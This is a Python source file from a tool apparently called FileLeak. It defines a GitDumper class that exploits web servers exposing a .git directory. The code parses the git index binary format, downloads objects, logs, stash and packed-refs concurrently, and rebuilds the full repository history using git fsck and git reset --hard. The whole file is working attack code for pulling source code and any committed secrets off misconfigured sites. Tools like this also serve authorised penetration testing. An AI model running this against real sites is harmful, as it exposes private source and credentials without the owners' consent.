"""Git repository leak dumper for FileLeak."""

import asyncio
import logging
import os
import re
import struct
import subprocess
import zlib

from rich.console import Console

from fileleak.core.base import BaseDumper
from fileleak.core.utils import save_file

logger = logging.getLogger(__name__)
console = Console()


class GitDumper(BaseDumper):
    """Git repository leak exploiter.

    Supports two modes:
    - Quick mode (default): Parse .git/index, download current version objects,
      decompress and save source files directly.
    - Full mode: Reconstruct the entire git repository with full history,
      run git fsck to fix missing objects, and git reset --hard.
    """

    GIT_CONFIG_FILES = [
        "HEAD", "config", "description", "index",
        "packed-refs", "COMMIT_EDITMSG",
        "info/exclude", "info/refs",
        "logs/HEAD", "logs/refs/heads/master",
        "logs/refs/remotes/origin/HEAD",
        "refs/heads/master", "refs/remotes/origin/HEAD",
        "refs/stash",
    ]

    def __init__(self, url: str, full_mode: bool = False, **kwargs):
        super().__init__(url, **kwargs)
        self.full_mode = full_mode
        self.base_url = self._normalize_git_url(url)
        self.objects_downloaded: set[str] = set()

    # ------------------------------------------------------------------
    # Entry point
    # ------------------------------------------------------------------

    async def start(self):
        """Entry point — dispatch to quick or full mode."""
        try:
            await self.http.init_session()
            await self.http.detect_fake_404(self.base_url)

            if self.full_mode:
                await self._full_dump()
            else:
                await self._quick_dump()
        finally:
            await self.http.close()
            self._print_summary()

    # ------------------------------------------------------------------
    # Quick mode
    # ------------------------------------------------------------------

    async def _quick_dump(self):
        """Quick mode: parse index, download current objects, save source files."""
        console.print("[bold cyan][*] Quick mode: recovering current version source[/]")

        # 1. Download index
        console.print("[*] Downloading .git/index ...")
        index_url = self.base_url + "index"
        try:
            status, index_data = await self.http.fetch(index_url)
        except Exception as e:
            console.print(f"[bold red][!] Failed to download index: {e}[/]")
            return

        if status != 200:
            console.print(f"[bold red][!] HTTP {status} for .git/index[/]")
            return

        # 2. Parse index
        try:
            entries = self.parse_index(index_data)
        except ValueError as e:
            console.print(f"[bold red][!] Failed to parse index: {e}[/]")
            return

        if not entries:
            console.print("[bold yellow][!] No entries found in index[/]")
            return

        console.print(f"[+] Found {len(entries)} entries in index")

        # 3. Download objects concurrently
        console.print("[*] Downloading objects ...")
        semaphore = asyncio.Semaphore(self.http.concurrency)

        async def _download_one(sha1: str, filename: str):
            async with semaphore:
                await self._download_object(sha1, filename)

        tasks = [_download_one(sha1, name) for sha1, name in entries]
        await asyncio.gather(*tasks)

        console.print("[+] Quick dump complete")

    # ------------------------------------------------------------------
    # Full mode
    # ------------------------------------------------------------------

    async def _full_dump(self):
        """Full mode: reconstruct entire git repository."""
        console.print("[bold cyan][*] Full mode: reconstructing entire git repository[/]")

        # 1. Download config files
        console.print("[*] Downloading git config files ...")
        for filepath in self.GIT_CONFIG_FILES:
            url = self.base_url + filepath
            filename = f".git/{filepath}"
            await self.download(url, filename)

        # 2. Detect current branch and download branch-specific files
        current_branch = self._detect_current_branch()
        if current_branch:
            console.print(f"[*] Detected current branch: {current_branch}")
            for prefix in ("refs/heads/", "logs/refs/heads/"):
                filepath = f"{prefix}{current_branch}"
                url = self.base_url + filepath
                filename = f".git/{filepath}"
                await self.download(url, filename)

        # Also try common branches not already covered
        for branch in ("main", "develop", "release"):
            for prefix in ("refs/heads/", "logs/refs/heads/"):
                filepath = f"{prefix}{branch}"
                url = self.base_url + filepath
                filename = f".git/{filepath}"
                await self.download(url, filename)

        # Download stash refs (may contain work-in-progress commits)
        console.print("[*] Downloading stash refs...")
        for filepath in ("refs/stash", "logs/refs/stash"):
            url = self.base_url + filepath
            filename = f".git/{filepath}"
            await self.download(url, filename)

        # Download ORIGIN refs (remote tracking branches)
        console.print("[*] Downloading remote refs...")
        for filepath in ("refs/remotes/origin/HEAD", "logs/refs/remotes/origin/HEAD"):
            url = self.base_url + filepath
            filename = f".git/{filepath}"
            await self.download(url, filename)

        # 3. Parse logs for commit hashes
        console.print("[*] Parsing commit logs ...")
        commit_hashes = await self._parse_logs_for_commits()

        if commit_hashes:
            console.print(f"[+] Found {len(commit_hashes)} commit hashes")
            console.print("[*] Downloading commit objects ...")
            semaphore = asyncio.Semaphore(self.http.concurrency)

            async def _dl_commit(sha1: str):
                async with semaphore:
                    await self._download_object_raw(sha1)

            await asyncio.gather(*[_dl_commit(h) for h in commit_hashes])
        else:
            console.print("[yellow][!] No commit hashes found in logs[/]")

        # 4. Parse packed-refs for additional references
        console.print("[*] Parsing packed-refs ...")
        await self._download_packed_refs()

        # 5. fsck loop to fix missing objects
        console.print("[*] Running fsck loop to fix missing objects ...")
        await self._fsck_loop()

        # 6. git reset --hard
        console.print("[*] Running git reset --hard ...")
        await self._git_reset_hard()

        console.print("[+] Full dump complete")

    # ------------------------------------------------------------------
    # Data conversion
    # ------------------------------------------------------------------

    def convert(self, data: bytes) -> bytes:
        """Decompress git object and strip blob/tree/commit header.

        For non-zlib data (e.g. plain-text config files), returns raw bytes.
        """
        try:
            data = zlib.decompress(data)
        except zlib.error:
            return data
        # Strip "blob NNN\\0" / "tree NNN\\0" / "commit NNN\\0" header
        null_idx = data.find(b"\x00")
        if null_idx != -1 and null_idx < 32:
            data = data[null_idx + 1 :]
        return data

    # ------------------------------------------------------------------
    # Git index parser
    # ------------------------------------------------------------------

    @staticmethod
    def parse_index(data: bytes) -> list[tuple[str, str]]:
        """Parse git index binary format, return list of (sha1_hex, filename).

        Supports index format versions 2, 3, and 4.
        """
        offset = 0

        # -- Header -------------------------------------------------------
        sig = data[offset : offset + 4]
        if sig != b"DIRC":
            raise ValueError(f"Invalid git index signature: {sig!r}")
        offset += 4

        version = struct.unpack_from(">I", data, offset)[0]
        offset += 4
        if version not in (2, 3, 4):
            raise ValueError(f"Unsupported git index version: {version}")

        num_entries = struct.unpack_from(">I", data, offset)[0]
        offset += 4

        # -- Entries ------------------------------------------------------
        entries: list[tuple[str, str]] = []
        prev_name = ""

        for _ in range(num_entries):
            # Skip 40 bytes of stat fields:
            #   ctime_s(4) + ctime_ns(4) + mtime_s(4) + mtime_ns(4)
            #   + dev(4) + ino(4) + mode(4) + uid(4) + gid(4) + size(4)
            offset += 40

            # SHA-1 hash — 20 bytes
            sha1_hex = data[offset : offset + 20].hex()
            offset += 20

            # Flags — 2 bytes
            flags = struct.unpack_from(">H", data, offset)[0]
            offset += 2

            entry_len = 62  # 40 (stat) + 20 (sha1) + 2 (flags)

            # Version 3+: extended flags if flag bit 0x4000 is set
            if version >= 3 and (flags & 0x4000):
                offset += 2
                entry_len += 2

            # Name length — lower 12 bits of flags
            name_len = flags & 0xFFF

            if version < 4:
                # Version 2/3: direct name + NUL padding to 8-byte boundary
                if name_len < 0xFFF:
                    name = data[offset : offset + name_len].decode(
                        "utf-8", "replace"
                    )
                    offset += name_len
                    entry_len += name_len
                else:
                    # Name longer than 0xFFF bytes — read until NUL
                    end = data.index(b"\x00", offset)
                    name = data[offset:end].decode("utf-8", "replace")
                    entry_len += end - offset
                    offset = end  # NUL is consumed as part of padding

                # Padding: NUL bytes so entry is a multiple of 8 bytes
                pad_len = (8 - (entry_len % 8)) or 8
                offset += pad_len
            else:
                # Version 4: prefix-compressed name, no padding
                strip_len, offset = GitDumper._read_varint(data, offset)
                # Read NUL-terminated suffix string
                end = data.index(b"\x00", offset)
                suffix = data[offset:end].decode("utf-8", "replace")
                offset = end + 1  # skip past NUL terminator

                if strip_len > 0:
                    base = (
                        prev_name[:-strip_len]
                        if strip_len <= len(prev_name)
                        else ""
                    )
                else:
                    base = prev_name
                name = base + suffix
                prev_name = name

            entries.append((sha1_hex, name))

        return entries

    @staticmethod
    def _read_varint(data: bytes, offset: int) -> tuple[int, int]:
        """Read a git variable-length integer (OFS_DELTA encoding).

        Returns (value, new_offset).
        """
        byte = data[offset]
        offset += 1
        value = byte & 0x7F
        while byte & 0x80:
            value = (value + 1) << 7
            byte = data[offset]
            offset += 1
            value |= byte & 0x7F
        return value, offset

    # ------------------------------------------------------------------
    # URL handling
    # ------------------------------------------------------------------

    @staticmethod
    def _normalize_git_url(url: str) -> str:
        """Normalize URL to point to .git/ base directory."""
        url = url.rstrip("/")
        if url.endswith(".git"):
            return url + "/"
        return url + "/.git/"

    # ------------------------------------------------------------------
    # Object download helpers
    # ------------------------------------------------------------------

    async def _download_object(self, sha1: str, filename: str):
        """Download a single git object and save as *filename* (Quick mode).

        Uses BaseDumper.download() which applies convert()
        (zlib decompress + header strip) before saving.
        """
        if sha1 in self.objects_downloaded:
            self.skipped_count += 1
            return

        object_url = f"{self.base_url}objects/{sha1[:2]}/{sha1[2:]}"
        success = await self.download(object_url, filename)
        if success:
            self.objects_downloaded.add(sha1)

    async def _download_object_raw(self, sha1: str):
        """Download a git object and save as raw compressed data (Full mode).

        Saves directly to .git/objects/XX/XXXXXX without decompression,
        preserving the format that git expects on disk.
        """
        if sha1 in self.objects_downloaded:
            return

        object_path = f".git/objects/{sha1[:2]}/{sha1[2:]}"
        safe_path = self.validate_path(object_path)
        if safe_path is None:
            return

        # Resume support: skip if file already exists
        if os.path.exists(safe_path):
            self.objects_downloaded.add(sha1)
            self.skipped_count += 1
            return

        object_url = f"{self.base_url}objects/{sha1[:2]}/{sha1[2:]}"
        try:
            status, content = await self.http.fetch(object_url)
            if status != 200:
                logger.debug(f"HTTP {status} for object {sha1}")
                self.failed_count += 1
                return
            # Save raw compressed data — no convert()
            await save_file(safe_path, content)
            self.objects_downloaded.add(sha1)
            self.downloaded_count += 1
        except Exception as e:
            logger.warning(f"Failed to download object {sha1}: {e}")
            self.failed_count += 1

    # ------------------------------------------------------------------
    # Full mode: branch detection
    # ------------------------------------------------------------------

    def _detect_current_branch(self) -> str | None:
        """Detect the current branch from the downloaded HEAD file."""
        head_path = os.path.join(self.output_dir, ".git", "HEAD")
        if not os.path.exists(head_path):
            return None
        try:
            with open(head_path, "r", encoding="utf-8") as f:
                content = f.read().strip()
            if content.startswith("ref: refs/heads/"):
                return content[len("ref: refs/heads/") :]
        except OSError:
            pass
        return None

    # ------------------------------------------------------------------
    # Full mode: log parsing
    # ------------------------------------------------------------------

    async def _parse_logs_for_commits(self) -> list[str]:
        """Parse .git/logs/HEAD (and branch logs) for commit hashes.
        
        Enhanced to parse:
        - HEAD log
        - All branch logs (refs/heads/*)
        - Stash log (refs/stash)
        - Remote branch logs (refs/remotes/*)
        """
        hashes: set[str] = set()

        # Standard log file locations
        log_files = [
            os.path.join(self.output_dir, ".git", "logs", "HEAD"),
            os.path.join(
                self.output_dir, ".git", "logs", "refs", "heads", "master"
            ),
            os.path.join(
                self.output_dir, ".git", "logs", "refs", "heads", "main"
            ),
            os.path.join(
                self.output_dir, ".git", "logs", "refs", "stash"
            ),
        ]

        # Also scan for any other branch log files
        refs_heads_dir = os.path.join(
            self.output_dir, ".git", "logs", "refs", "heads"
        )
        if os.path.isdir(refs_heads_dir):
            try:
                for name in os.listdir(refs_heads_dir):
                    log_files.append(os.path.join(refs_heads_dir, name))
            except OSError:
                pass
        
        # Scan remote refs
        refs_remotes_dir = os.path.join(
            self.output_dir, ".git", "logs", "refs", "remotes"
        )
        if os.path.isdir(refs_remotes_dir):
            try:
                for root, dirs, files in os.walk(refs_remotes_dir):
                    for name in files:
                        log_files.append(os.path.join(root, name))
            except OSError:
                pass

        for log_file in log_files:
            if not os.path.exists(log_file):
                continue
            try:
                with open(log_file, "r", encoding="utf-8", errors="replace") as f:
                    for line in f:
                        # Format: <parent_hash> <child_hash> <rest...>
                        parts = line.split()
                        if len(parts) >= 2:
                            for h in parts[:2]:
                                if re.fullmatch(r"[0-9a-f]{40}", h):
                                    hashes.add(h)
            except OSError as e:
                logger.warning(f"Failed to read log file {log_file}: {e}")

        return list(hashes)

    # ------------------------------------------------------------------
    # Full mode: packed-refs
    # ------------------------------------------------------------------

    async def _download_packed_refs(self):
        """Parse .git/packed-refs and download referenced objects."""
        packed_refs_path = os.path.join(self.output_dir, ".git", "packed-refs")
        if not os.path.exists(packed_refs_path):
            return

        hashes: set[str] = set()
        try:
            with open(
                packed_refs_path, "r", encoding="utf-8", errors="replace"
            ) as f:
                for line in f:
                    line = line.strip()
                    if line.startswith("#"):
                        continue
                    # Peeled tag line: ^<sha1>
                    if line.startswith("^"):
                        h = line[1:].strip()
                        if re.fullmatch(r"[0-9a-f]{40}", h):
                            hashes.add(h)
                        continue
                    # Regular line: <sha1> <ref_path>
                    parts = line.split()
                    if parts:
                        h = parts[0]
                        if re.fullmatch(r"[0-9a-f]{40}", h):
                            hashes.add(h)
        except OSError as e:
            logger.warning(f"Failed to read packed-refs: {e}")
            return

        if not hashes:
            return

        console.print(f"[*] Found {len(hashes)} hashes in packed-refs")

        semaphore = asyncio.Semaphore(self.http.concurrency)

        async def _dl(sha1: str):
            async with semaphore:
                await self._download_object_raw(sha1)

        await asyncio.gather(*[_dl(h) for h in hashes])

    # ------------------------------------------------------------------
    # Full mode: fsck loop
    # ------------------------------------------------------------------

    async def _fsck_loop(self, max_rounds: int = 10):
        """Run git fsck, download missing objects, repeat until complete."""
        git_dir = os.path.join(self.output_dir, ".git")
        if not os.path.exists(git_dir):
            console.print("[yellow][!] .git directory not found, skipping fsck[/]")
            return

        for round_num in range(1, max_rounds + 1):
            console.print(f"[*] fsck round {round_num}/{max_rounds} ...")

            missing = await self._run_git_fsck()
            if not missing:
                console.print("[+] No missing objects detected")
                return

            # Filter out already-downloaded objects
            new_missing = [h for h in missing if h not in self.objects_downloaded]
            if not new_missing:
                console.print("[+] All missing objects already downloaded")
                return

            console.print(f"[!] Found {len(new_missing)} missing objects")

            semaphore = asyncio.Semaphore(self.http.concurrency)

            async def _dl(sha1: str):
                async with semaphore:
                    await self._download_object_raw(sha1)

            await asyncio.gather(*[_dl(h) for h in new_missing])

        console.print(
            f"[yellow][!] fsck loop reached max rounds ({max_rounds})[/]"
        )

    async def _run_git_fsck(self) -> list[str]:
        """Run ``git fsck --full`` and return list of missing object SHA1s."""
        import sys
        
        try:
            # Windows requires CREATE_NO_WINDOW flag for subprocess
            if sys.platform == "win32":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                proc = await asyncio.create_subprocess_exec(
                    "git",
                    "fsck",
                    "--full",
                    cwd=self.output_dir,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    startupinfo=startupinfo,
                )
            else:
                proc = await asyncio.create_subprocess_exec(
                    "git",
                    "fsck",
                    "--full",
                    cwd=self.output_dir,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
        except FileNotFoundError:
            logger.warning("git not found — cannot run fsck")
            return []
        except asyncio.TimeoutError:
            logger.warning("git fsck timed out")
            return []
        except Exception as e:
            logger.warning(f"git fsck failed: {e}")
            return []

        missing: list[str] = []
        # git fsck outputs to stdout, errors go to stderr
        output = stdout.decode("utf-8", "replace") + stderr.decode("utf-8", "replace")
        
        for line in output.splitlines():
            # Match "missing <type> <sha1>"
            match = re.match(
                r"missing (?:blob|tree|commit|tag) ([0-9a-f]{40})", line
            )
            if match:
                missing.append(match.group(1))
                continue
            
            # Match "broken link from ..."
            match = re.match(r"broken link from", line)
            if match:
                sha_match = re.search(r"[0-9a-f]{40}", line)
                if sha_match:
                    missing.append(sha_match.group(0))
                continue
            
            # Match continuation line "              to    <type> <sha1>"
            match = re.match(r"\s+to\s+(?:blob|tree|commit|tag)\s+([0-9a-f]{40})", line)
            if match:
                missing.append(match.group(1))
        
        return missing

    # ------------------------------------------------------------------
    # Full mode: git reset
    # ------------------------------------------------------------------

    async def _git_reset_hard(self):
        """Run ``git reset --hard`` in the output directory."""
        import sys
        
        try:
            # Windows requires CREATE_NO_WINDOW flag for subprocess
            if sys.platform == "win32":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                proc = await asyncio.create_subprocess_exec(
                    "git",
                    "reset",
                    "--hard",
                    cwd=self.output_dir,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    startupinfo=startupinfo,
                )
            else:
                proc = await asyncio.create_subprocess_exec(
                    "git",
                    "reset",
                    "--hard",
                    cwd=self.output_dir,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
            await asyncio.wait_for(proc.communicate(), timeout=30)
            console.print("[+] git reset --hard completed")
        except FileNotFoundError:
            logger.warning("git not found — cannot run reset")
            console.print("[yellow][!] git not found, cannot run reset[/]")
        except asyncio.TimeoutError:
            logger.warning("git reset --hard timed out")
            console.print("[yellow][!] git reset --hard timed out[/]")

    # ------------------------------------------------------------------
    # Summary
    # ------------------------------------------------------------------

    def _print_summary(self):
        """Print download statistics summary."""
        stats = self.get_stats()
        console.print(
            f"\n[bold green][+] Download summary:[/] "
            f"downloaded={stats['downloaded']}, "
            f"failed={stats['failed']}, "
            f"skipped={stats['skipped']}"
        )
